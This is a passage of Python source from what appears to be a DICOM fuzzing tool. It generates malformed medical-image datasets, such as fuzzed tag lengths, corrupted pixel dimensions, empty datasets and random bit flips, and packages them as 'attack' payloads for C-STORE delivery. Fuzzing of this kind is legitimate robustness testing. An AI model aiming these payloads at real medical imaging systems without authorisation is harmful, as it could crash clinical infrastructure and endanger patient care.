    def target_length_handling(self) -> Generator[AttackResult, None, None]:
        """Generate length-based attacks on each element."""
        lengths = [0, 1, 0xFFFF, 0xFFFFFFFF]
        
        for tag in self.source.keys():
            for length in lengths:
                c = Corruptor(self.source)
                c.set_length(tag, length)
                
                yield AttackResult(
                    name=f'length_fuzz_{tag}_{length:#x}',
                    category='targeted',
                    payload=c.to_bytes(),
                    description=f'Tag {tag} length set to {length:#x}',
                    expected_behavior='Parser should detect length issues',
                    metadata={'tag': tag, 'fuzzed_length': length}
                )
    
    def target_pixel_data(self) -> Generator[AttackResult, None, None]:
        """Generate pixel data attacks if present."""
        if (0x7FE0, 0x0010) not in self.source:
            return
        
        # Corrupt dimensions
        for val in [0, 1, 0xFFFF]:
            c = Corruptor(self.source)
            if (0x0028, 0x0010) in self.source:
                c.override((0x0028, 0x0010), struct.pack('<H', val))
            
            yield AttackResult(
                name=f'pixel_rows_{val}',
                category='targeted',
                payload=c.to_bytes(),
                description=f'Rows set to {val}',
                expected_behavior='Parser should validate dimensions',
                metadata={'rows': val}
            )


# Deprecated alias - kept for backward compatibility.
TargetedFuzzer = TargetedSeedGenerator


# =============================================================================
# Combined Attacks - Dataset + Protocol together
# =============================================================================

class CombinedAttacks:
    """
    Combined attacks that pair a corrupted dataset with C-STORE delivery
    metadata. Pure payload generators — no network I/O.

    Use ``deliver.send_cstore`` to deliver these over the network.
    """

    @staticmethod
    def corrupt_store(dataset_attack: AttackResult,
                      sop_class_uid: str = None,
                      sop_instance_uid: str = '1.2.3.4.5') -> AttackResult:
        """C-STORE payload with corrupted dataset."""
        sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID
        return AttackResult(
            name='corrupt_store',
            category='combined',
            payload=dataset_attack.payload,
            description=f'C-STORE with {dataset_attack.name}',
            expected_behavior='Target should reject corrupt dataset',
            metadata={
                'inner_attack': dataset_attack.name,
                'delivery': 'cstore',
                'sop_class_uid': sop_class,
                'sop_instance_uid': sop_instance_uid,
            },
        )

    @staticmethod
    def zero_length_dataset() -> AttackResult:
        """C-STORE with empty dataset."""
        return CombinedAttacks.corrupt_store(
            AttackResult(
                name='zero_length',
                category='combined',
                payload=b'',
                description='Empty dataset',
                expected_behavior='Should reject',
            ),
        )

    @staticmethod
    def bitflip_corruption(dataset: bytes,
                           flip_count: int = 10) -> AttackResult:
        """C-STORE with random bit flips."""
        corrupted = bytearray(dataset)
        for _ in range(min(flip_count, len(corrupted))):
            idx = random.randint(0, len(corrupted) - 1)
            corrupted[idx] ^= random.randint(1, 255)

        return CombinedAttacks.corrupt_store(
            AttackResult(
                name='bitflip',
                category='combined',
                payload=bytes(corrupted),
                description=f'{flip_count} random bit flips',
                expected_behavior='Should handle gracefully',
            ),
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield combined attack payloads."""
        yield cls.zero_length_dataset()
